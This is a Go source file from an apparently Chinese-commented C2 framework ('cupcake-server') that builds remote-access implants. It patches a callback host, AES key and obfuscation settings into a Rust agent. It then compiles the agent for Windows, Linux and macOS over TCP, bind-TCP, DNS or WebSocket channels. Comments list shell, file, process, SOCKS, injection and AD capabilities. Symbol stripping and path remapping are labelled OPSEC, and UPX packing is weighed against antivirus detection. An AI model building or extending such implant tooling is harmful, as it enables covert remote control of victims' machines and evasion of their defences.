package services

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"

	"github.com/google/uuid"
)

const (
	SourceDir    = "../Client"     // Relative to server/
	BuildBaseDir = "./temp_builds" // Sandbox root

	// cargoAgentBinName must match Client/core/Cargo.toml [[bin]] name.
	// (Renamed from package-default cupcake-core to avoid Windows PDB clash with lib cupcake_core.)
	cargoAgentBinName = "cupcake-agent"
	// Legacy name if an old workspace still emits the package-default bin.
	cargoAgentBinLegacy = "cupcake-core"
)

// ArtifactDir / SharedTargetDir / isolatedCargoHome resolve under CUPCAKE_DATA_DIR.
func artifactDir() string    { return paths.Join("payloads") }
func sharedTargetDir() string { return paths.Join("build_cache", "target") }
func isolatedCargoHomeDir() string {
	return paths.Join("build_cache", "cargo_home")
}

type PayloadConfig struct {
	Arch              string `json:"arch"`
	Protocol          string `json:"protocol"`
	Host              string `json:"host"`
	Port              string `json:"port"`
	AESKey            string `json:"aes_key"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	DNSResolver       string `json:"dns_resolver"`
	OSType            string `json:"os_type"`
	AutoDestruct      bool   `json:"auto_destruct"`
	SleepTime         int    `json:"sleep_time"`
	UseUPX            bool   `json:"use_upx"`
	EncryptionSalt    string `json:"encryption_salt"`
	ObfuscationMode   string `json:"obfuscation_mode"`
	Jitter            int    `json:"jitter"`
	// Profile is connection *direction* for UI (reverse/forward), NOT a cargo capability tier.
	// Stage0 cargo features are always **minimal** (sole product aggregate).
	// Heavy caps: L2 modules (bof / inject / ad).
	Profile string `json:"profile"`
}

// copyDir recursively copies a directory tree
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		relPath, _ := filepath.Rel(src, path)
		
		// 🛡️ Skip target folders, git history, and other heavy/unnecessary files
		name := info.Name()
		if info.IsDir() && (name == "target" || name == ".git" || name == ".idea" || name == ".vscode") {
			return filepath.SkipDir
		}
		
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() { return os.MkdirAll(dstPath, info.Mode()) }
		
		sf, err := os.Open(path); if err != nil { return err }; defer sf.Close()
		df, err := os.Create(dstPath); if err != nil { return err }; defer df.Close()
		if _, err := io.Copy(df, sf); err != nil { return err }
		return os.Chmod(dstPath, info.Mode())
	})
}

// validateC2Host ensures the C2 callback host is a valid hostname or IP:port,
// without path separators or shell metacharacters that could cause code injection.
func validateC2Host(host string) error {
	if host == "" {
		return fmt.Errorf("C2 host is required")
	}
	// Reject path separators and shell metacharacters
	bad := []string{"/", "\\", ";", "&", "|", "`", "$", "\n", "\r", "\"", "'", "<", ">", "(", ")", "{", "}", "[", "]"}
	for _, ch := range bad {
		if strings.Contains(host, ch) {
			return fmt.Errorf("C2 host contains invalid character: %q", ch)
		}
	}
	return nil
}

// ensureIsolatedCargoHome creates a CARGO_HOME that ignores user ~/.cargo/config.toml
// (which often forces replace-with=ustc behind a dead 127.0.0.1 proxy), while reusing
// the user's registry/git caches via directory junctions (Windows) or symlinks.
func ensureIsolatedCargoHome(logChan chan<- string) (string, error) {
	home, err := filepath.Abs(isolatedCargoHomeDir())
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(home, 0755); err != nil {
		return "", err
	}
	cfg := `# Isolated Cupcake build CARGO_HOME — no crates-io replace-with.
# Registry cache is linked from the user cargo home when available.
[registries.crates-io]
protocol = "sparse"

[net]
git-fetch-with-cli = true
`
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(cfg), 0644); err != nil {
		return "", err
	}

	userCargo := os.Getenv("CARGO_HOME")
	if userCargo == "" {
		if up := os.Getenv("USERPROFILE"); up != "" {
			userCargo = filepath.Join(up, ".cargo")
		} else if h := os.Getenv("HOME"); h != "" {
			userCargo = filepath.Join(h, ".cargo")
		}
	}
	for _, name := range []string{"registry", "git"} {
		src := filepath.Join(userCargo, name)
		dst := filepath.Join(home, name)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if fi, err := os.Lstat(dst); err == nil {
			// Already present (junction/dir) — keep
			_ = fi
			continue
		}
		if err := linkCargoCacheDir(src, dst); err != nil {
			if logChan != nil {
				logChan <- fmt.Sprintf("[Builder] 警告: 无法链接 cargo %s 缓存 (%v)，将使用独立缓存", name, err)
			}
		} else if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 已链接用户 cargo/%s 缓存 → 隔离 CARGO_HOME", name)
		}
	}
	return home, nil
}

func linkCargoCacheDir(src, dst string) error {
	// Prefer Windows junction (no admin); fall back to symlink / plain copy skip.
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/C", "mklink", "/J", dst, src)
		if out, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("mklink /J: %v (%s)", err, strings.TrimSpace(string(out)))
		}
		return nil
	}
	return os.Symlink(src, dst)
}

// cargoBuildEnv builds a clean environment for cargo: isolated CARGO_HOME, no dead proxies.
func cargoBuildEnv(absTargetDir, absWorkspace, cargoHome string) []string {
	base := os.Environ()
	strip := map[string]bool{
		"HTTP_PROXY": true, "HTTPS_PROXY": true, "ALL_PROXY": true,
		"http_proxy": true, "https_proxy": true, "all_proxy": true,
		"FTP_PROXY": true, "ftp_proxy": true,
		"CARGO_HOME": true, // replace below
	}
	out := make([]string, 0, len(base)+16)
	for _, kv := range base {
		eq := strings.IndexByte(kv, '=')
		if eq <= 0 {
			continue
		}
		key := kv[:eq]
		if strip[key] || strip[strings.ToUpper(key)] {
			continue
		}
		out = append(out, kv)
	}
	wireSeed := utils.WireSeed()
	// Neutral remap prefixes (no product brand in debug paths)
	out = append(out,
		"HTTP_PROXY=",
		"HTTPS_PROXY=",
		"ALL_PROXY=",
		"http_proxy=",
		"https_proxy=",
		"all_proxy=",
		"CARGO_TERM_COLOR=never",
		"CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse",
		fmt.Sprintf("CARGO_HOME=%s", cargoHome),
		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
		fmt.Sprintf("CUPCAKE_WIRE_SEED=%s", wireSeed),
		fmt.Sprintf("RUSTFLAGS=-C strip=symbols --remap-path-prefix %s=/src --remap-path-prefix %s=/home", absWorkspace, os.Getenv("USERPROFILE")),
	)
	return out
}

// runCargoBuild starts cargo with streaming logs; returns wait error.
func runCargoBuild(workspace string, args []string, env []string, logChan chan<- string) error {
	cmd := exec.Command("cargo", args...)
	cmd.Dir = workspace
	cmd.Env = env

	pipeReader, pipeWriter := io.Pipe()
	cmd.Stdout = pipeWriter
	cmd.Stderr = pipeWriter

	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " "))
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start cargo: %v", err)
	}

	go func() {
		scanner := bufio.NewScanner(pipeReader)
		// cargo lines can be long
		buf := make([]byte, 0, 64*1024)
		scanner.Buffer(buf, 1024*1024)
		for scanner.Scan() {
			line := scanner.Text()
			if logChan != nil {
				select {
				case logChan <- line:
				default:
				}
				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
				}
			}
		}
		pipeReader.Close()
	}()

	waitErr := cmd.Wait()
	pipeWriter.Close()
	return waitErr
}

// BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
	buildID := uuid.New().String()
	workspace := filepath.Join(BuildBaseDir, buildID)
	
	os.MkdirAll(BuildBaseDir, 0755)
	os.MkdirAll(artifactDir(), 0755)
	os.MkdirAll(sharedTargetDir(), 0755)

	if logChan != nil { logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..." }
	if err := copyDir(SourceDir, workspace); err != nil {
		return "", fmt.Errorf("failed to create sandbox: %v", err)
	}
	defer os.RemoveAll(workspace)

	cargoHome, err := ensureIsolatedCargoHome(logChan)
	if err != nil {
		return "", fmt.Errorf("failed to prepare isolated CARGO_HOME: %v", err)
	}
	if logChan != nil {
		logChan <- "[Builder] 使用隔离 CARGO_HOME（忽略用户 ustc 镜像）；已清除 HTTP(S)_PROXY"
	}

	// 安全校验：防止 C2 Host 注入恶意内容到 Rust 源码
	if err := validateC2Host(conf.Host); err != nil {
		return "", fmt.Errorf("invalid C2 host: %v", err)
	}

	var connStr string
	protocol := strings.ToLower(conf.Protocol)
	if protocol == "tcp" {
		connStr = fmt.Sprintf("%s:%s", conf.Host, conf.Port)
	} else if protocol == "dns" {
		connStr = conf.Host 
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		connStr = fmt.Sprintf("bind://0.0.0.0:%s", conf.Port)
	} else if protocol == "wss" {
		connStr = fmt.Sprintf("wss://%s:%s/ws", conf.Host, conf.Port)
	} else {
		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
	}

	if logChan != nil {
		logChan <- "[Builder] core engine init"
		logChan <- fmt.Sprintf("[Builder] wire_seed=%s (magics/Noise/module domain)", utils.WireSeed())
	}

	configPath := filepath.Join(workspace, "core", "src", "config.rs")
	if logChan != nil {
		logChan <- "[Builder] injecting endpoint + crypto config..."
	}

	// Fetch System AES Key if none provided
	aesKey := conf.AESKey
	if aesKey == "" {
		aesKey = store.GetSetting("system_aes_key")
		if logChan != nil {
			logChan <- "[Builder] using system AES material"
		}
	}
	// Per-build unique salt (PSK base AES stays listener-shared for Noise; salt isolates module KDF)
	salt := strings.TrimSpace(conf.EncryptionSalt)
	if salt == "" {
		if s, err := utils.RandomAlphaString(24); err == nil {
			salt = s
		} else {
			salt = fmt.Sprintf("s%016x", time.Now().UnixNano())
		}
		if logChan != nil {
			logChan <- "[Builder] minted unique KDF salt for this payload"
		}
	}

	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, salt, conf.ObfuscationMode); err != nil {
		return "", fmt.Errorf("config patch failed: %v", err)
	}

	if logChan != nil {
		logChan <- "\x1b[32m[Builder] 配置注入成功! 准备构建受控端核心...\x1b[0m"
		logChan <- "\x1b[36m[Builder] 如果系统正在由于病毒查报导致文件被占用，以下过程可能会稍有延迟...\x1b[0m"
	}

	args := []string{"build", "-p", "cupcake-core", "--release"}

	// Sanitize OS and Arch to prevent path traversal, then normalize arch aliases.
	conf.OSType = filepath.Base(strings.TrimSpace(conf.OSType))
	conf.Arch = filepath.Base(strings.TrimSpace(conf.Arch))
	normArch := normalizeBuildArch(conf.Arch)
	target := resolveCargoTarget(conf.OSType, normArch, runtime.GOOS)
	cross := isCargoCrossCompile(conf.OSType, normArch, runtime.GOOS, runtime.GOARCH)

	// Only append --target when cross-compiling (native host uses default host triple).
	if target != "" && cross {
		args = append(args, "--target", target)
		if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] cross-compile --target %s (os=%s arch=%s→%s)", target, conf.OSType, conf.Arch, normArch)
		}
	} else if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] host-native build (os=%s arch=%s→%s, cargo target empty/default)", conf.OSType, conf.Arch, normArch)
	}

	// Sole product cargo tier: always minimal (ignore legacy standard/full/beacon names).
	// shell/fs/proc/pty/socks built-in; BOF → bof L2 (in-process); inject/ad L2 workers; .NET retired.
	// conf.Profile remains reverse/forward direction for UI only.
	capProfile := "minimal"
	if p := strings.ToLower(strings.TrimSpace(conf.Profile)); p != "" {
		switch p {
		case "standard", "full", "beacon":
			if logChan != nil {
				logChan <- fmt.Sprintf("[Builder] legacy profile %q ignored → cargo minimal", p)
			}
		}
	}
	isBind := protocol == "bind-tcp" || protocol == "正向tcp"
	if logChan != nil {
		logChan <- "[Builder] Cargo profile: minimal (sole product tier)"
		if isBind {
			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal（BOF/.NET 按需 L2 模块）"
		} else {
			logChan <- "[Builder] 反向客户端 — minimal（终端/文件/进程/socks 内置；重能力 L2）"
		}
	}
	if protocol == "tcp" {
		args = append(args, "--no-default-features", "--features", "tcp,"+capProfile)
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		args = append(args, "--no-default-features", "--features", "tcp_bind,"+capProfile)
	} else if protocol == "dns" {
		args = append(args, "--no-default-features", "--features", "dns,"+capProfile)
	} else if protocol == "wss" {
		args = append(args, "--no-default-features", "--features", "ws,ws-tls,"+capProfile)
	} else {
		args = append(args, "--no-default-features", "--features", "ws,"+capProfile)
	}

	if logChan != nil {
		modeStr := "全量构建"
		if _, err := os.Stat(sharedTargetDir()); err == nil {
			modeStr = "增量加速模式"
		}
		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr)
		logChan <- "[Builder] 策略: 优先 --offline（本地 crates 缓存）→ 失败再在线拉取（已清除 HTTP_PROXY）"
	}

	// ⚡ OPTIMIZATION: centralized target dir; 🛡️ remap paths for OPSEC
	absTargetDir, _ := filepath.Abs(sharedTargetDir())
	absWorkspace, _ := filepath.Abs(workspace)
	env := cargoBuildEnv(absTargetDir, absWorkspace, cargoHome)

	// Offline-first: uses %USERPROFILE%\.cargo\registry (index.crates.io-*) when
	// no user-level replace-with points at a different empty index (e.g. ustc).
	offlineArgs := append(append([]string{}, args...), "--offline")
	if logChan != nil {
		logChan <- "[Builder] 尝试离线编译 (--offline)..."
	}
	waitErr := runCargoBuild(workspace, offlineArgs, env, logChan)
	if waitErr != nil {
		if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 离线未成功 (%v)，改为在线编译（无系统代理）...", waitErr)
		}
		waitErr = runCargoBuild(workspace, args, env, logChan)
		if waitErr != nil {
			return "", fmt.Errorf("cargo build failed: %v；若仍访问 ustc/代理失败：检查 ~/.cargo/config.toml 的 replace-with，或运行 Client/scripts/cargo-use-local-cache.ps1", waitErr)
		}
	}

	// 🔍 Locate cargo [[bin]] artifact (cupcake-agent; legacy cupcake-core fallback).
	builtPath, err := findCargoAgentBinary(absTargetDir, target, cross, conf.OSType == "windows")
	if err != nil {
		return "", err
	}
	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] located agent binary: %s", builtPath)
	}

	ext := ""
	if conf.OSType == "windows" { ext = ".exe" }
	randSuffix, _ := utils.RandomAlphaString(8)
	finalPath := filepath.Join(artifactDir(), fmt.Sprintf("%s%s", randSuffix, ext))


	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
	if err := moveFile(builtPath, finalPath); err != nil { return "", fmt.Errorf("failed to save artifact: %v", err) }

	// 📦 UPX 压缩（默认关闭：现代 AV 对 UPX 特征极敏感，几乎是负优化）
	// 仅在用户明确勾选 UseUPX 时执行。
	if conf.UseUPX {
		if logChan != nil {
			logChan <- "[Builder] 警告: UPX 会显著提高 AV 检出率，仅建议在实验环境使用..."
			logChan <- "[Builder] 正在执行 UPX 压缩..."
		}
		if err := RunUPX(finalPath); err != nil {
			if logChan != nil { logChan <- "[!] UPX 失败: " + err.Error() }
		} else {
			if logChan != nil { logChan <- "[+] UPX 压缩成功" }
		}
	}

	if logChan != nil { logChan <- "[Builder] 构建成功!" }
	return finalPath, nil
}

// RunUPX 执行 UPX 压缩
func RunUPX(path string) error {
	cmd := exec.Command("upx", "-9", "--force", path)
	return cmd.Run()
}

// normalizeBuildArch maps UI/API arch aliases to Go-like tokens: amd64, 386, arm64, arm.
// Accepts: x64, amd64, x86_64, windows_amd64, i386, x86, arm64, aarch64, arm, ...
func normalizeBuildArch(arch string) string {
	a := strings.ToLower(strings.TrimSpace(arch))
	a = strings.ReplaceAll(a, "-", "_")
	// Strip OS_ prefix if present (windows_amd64 → amd64).
	for _, prefix := range []string{"windows_", "linux_", "darwin_", "macos_"} {
		if strings.HasPrefix(a, prefix) {
			a = strings.TrimPrefix(a, prefix)
			break
		}
	}
	if a == "" {
		return "amd64"
	}
	// Order matters: x86_64 / amd64 / x64 before bare x86.
	switch {
	case a == "x64" || a == "amd64" || a == "x86_64" || a == "x86_64_v2" ||
		strings.Contains(a, "amd64") || strings.Contains(a, "x86_64") || strings.Contains(a, "x64"):
		return "amd64"
	case a == "arm64" || a == "aarch64" || strings.Contains(a, "arm64") || strings.Contains(a, "aarch64"):
		return "arm64"
	case a == "x86" || a == "i386" || a == "i686" || a == "386" ||
		strings.Contains(a, "i386") || strings.Contains(a, "i686") ||
		(strings.Contains(a, "x86") && !strings.Contains(a, "x64") && !strings.Contains(a, "amd64")):
		return "386"
	case a == "arm" || a == "armv7" || (strings.Contains(a, "arm") && !strings.Contains(a, "arm64")):
		return "arm"
	default:
		return a
	}
}

// resolveCargoTarget picks a rustc target triple for the desired OS + normalized arch.
// hostGOOS is used only to choose windows-gnu vs windows-msvc when building on Linux vs Windows.
func resolveCargoTarget(osType, normArch, hostGOOS string) string {
	osType = strings.ToLower(strings.TrimSpace(osType))
	switch osType {
	case "windows":
		if hostGOOS == "linux" {
			switch normArch {
			case "amd64":
				return "x86_64-pc-windows-gnu"
			case "386":
				return "i686-pc-windows-gnu"
			default:
				return "x86_64-pc-windows-gnu"
			}
		}
		switch normArch {
		case "amd64":
			return "x86_64-pc-windows-msvc"
		case "386":
			return "i686-pc-windows-msvc"
		default:
			return "x86_64-pc-windows-msvc"
		}
	case "linux":
		switch normArch {
		case "arm64":
			return "aarch64-unknown-linux-musl"
		case "arm":
			return "armv7-unknown-linux-musleabihf"
		case "386":
			return "i686-unknown-linux-musl"
		default:
			return "x86_64-unknown-linux-musl"
		}
	case "darwin", "macos":
		switch normArch {
		case "arm64":
			return "aarch64-apple-darwin"
		default:
			return "x86_64-apple-darwin"
		}
	default:
		return ""
	}
}

// isCargoCrossCompile reports whether cargo needs an explicit --target.
func isCargoCrossCompile(osType, normArch, hostGOOS, hostGOARCH string) bool {
	osType = strings.ToLower(strings.TrimSpace(osType))
	if osType == "macos" {
		osType = "darwin"
	}
	if hostGOOS != osType {
		return true
	}
	// Map host GOARCH to same vocabulary as normalizeBuildArch.
	host := hostGOARCH
	switch host {
	case "amd64", "arm64", "arm", "386":
		// ok
	default:
		host = normalizeBuildArch(host)
	}
	return host != normArch
}

// agentBinaryCandidates returns preferred then legacy cargo bin basenames (with optional .exe).
func agentBinaryCandidates(windows bool) []string {
	names := []string{cargoAgentBinName, cargoAgentBinLegacy}
	if !windows {
		return names
	}
	out := make([]string, 0, len(names))
	for _, n := range names {
		out = append(out, n+".exe")
	}
	return out
}

// findCargoAgentBinary locates the built Stage0 binary under CARGO_TARGET_DIR.
// When cross is true, looks under target/<triple>/release; else target/release.
// Tries cupcake-agent first, then legacy cupcake-core.
func findCargoAgentBinary(absTargetDir, cargoTarget string, cross, windows bool) (string, error) {
	var dirs []string
	if cross && cargoTarget != "" {
		dirs = append(dirs, filepath.Join(absTargetDir, cargoTarget, "release"))
	}
	// Always also try host-native path (covers mis-detected cross and default builds).
	dirs = append(dirs, filepath.Join(absTargetDir, "release"))

	var tried []string
	for _, dir := range dirs {
		for _, name := range agentBinaryCandidates(windows) {
			p := filepath.Join(dir, name)
			tried = append(tried, p)
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				return p, nil
			}
		}
	}
	return "", fmt.Errorf(
		"binary not found (looked for %s / %s under release). tried: %s — ensure Client/core Cargo.toml [[bin]] name matches builder (%s)",
		cargoAgentBinName, cargoAgentBinLegacy, strings.Join(tried, "; "), cargoAgentBinName,
	)
}

// RebuildTemplates rebuilds all platform templates (always cargo **minimal**) into server/assets
// for Patch mode. Legacy OutName `*_minimal` kept as compatible aliases of the same binary.
func RebuildTemplates(logChan chan<- string) error {
	if logChan != nil { logChan <- "[Rebuilder] 启动全平台模板构建（唯一产品档 minimal）..." }
	
	targets := []struct {
		OS       string
		Arch     string
		Protocol string
		OutName  string
		Profile  string // always "minimal" (sole product cargo tier)
	}{
		{"windows", "amd64", "ws", "client_template_windows.exe", "minimal"},
		{"windows", "i386", "ws", "client_template_windows_x86.exe", "minimal"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "minimal"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp_minimal.exe", "minimal"},
		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "minimal"},
		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "minimal"},
		{"linux", "amd64", "ws", "client_template_linux", "minimal"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp", "minimal"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp_minimal", "minimal"},
		{"linux", "arm64", "ws", "client_template_linux_arm64", "minimal"},
	}

	for _, t := range targets {
		conf := PayloadConfig{
			OSType:            t.OS,
			Arch:              t.Arch,
			Protocol:          t.Protocol,
			Host:              "127.0.0.1",
			Port:              "8080",
			AESKey:            "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_", // Default placeholder
			HeartbeatInterval: 10,
			Profile:           t.Profile,
			UseUPX:            false,
		}
		
		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
		path, err := BuildAgentWithLogger(conf, nil)
		if err != nil {
			if logChan != nil { logChan <- fmt.Sprintf("[!] 模板编译失败 (%s): %v", t.OutName, err) }
			continue
		}
		
		// Move to assets
		dest := filepath.Join("assets", t.OutName)
		if err := os.Rename(path, dest); err != nil {
			// Try copy if rename fails across partitions
			if err := copyFile(path, dest); err == nil {
				os.Remove(path)
			}
		}
		if logChan != nil { logChan <- fmt.Sprintf("[+] 模板已就绪: assets/%s", t.OutName) }
	}

	if logChan != nil { logChan <- "[Rebuilder] v3.0.1 模板集更新完成。" }
	return nil
}

// Extension of services to support cloning for shellcode
func copyFile(src, dst string) error {
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	_, err = io.Copy(df, sf)
	return err
}

func patchConfig(path, connStr, aesKey string, heartbeat int, jitter int, dnsResolver string, salt string, obfMode string) error {
	content, err := os.ReadFile(path)
	if err != nil { return err }
	s := string(content)

	// 1. URL Patch (Static only)
	s = strings.Replace(s, "REPLACE_ME_URL", connStr, 1)
	
	// 2. AES Key Patch (Static only)
	if aesKey != "" {
		if !isValidAESKeyString(aesKey) {
			return fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
		}
		s = strings.Replace(s, "REPLACE_ME_AES_KEY", aesKey, 1)
	}

	// 3. Encryption Salt & Obfuscation
	// In Source Patching mode, we ONLY replace the constants.
	// Do NOT touch SYSTEM_PROVIDER_CRYPTO_KDF_SALT or OBF_MODE_STRICT in source code
	// because they are fixed-size arrays and changing their literal length breaks compilation.
	s = strings.Replace(s, "REPLACE_ME_SALT", salt, 1)
	
	// 4. Jitter Patch
	jitterStr := fmt.Sprintf("%d", jitter)
	s = strings.Replace(s, "REPLACE_ME_JITTER", jitterStr, 1)
	
	obfVal := strings.ToLower(obfMode)
	if obfVal == "" { obfVal = "none" }
	s = strings.Replace(s, "REPLACE_ME_OBF", obfVal, 1)
	
	return os.WriteFile(path, []byte(s), 0644)
}

func isValidAESKeyString(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) == 32 {
		return true
	}
	if len(key) == 64 && isHexString(key) {
		return true
	}
	return false
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil { return nil }
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	if _, err := io.Copy(df, sf); err != nil { return err }
	return os.Remove(src)
}
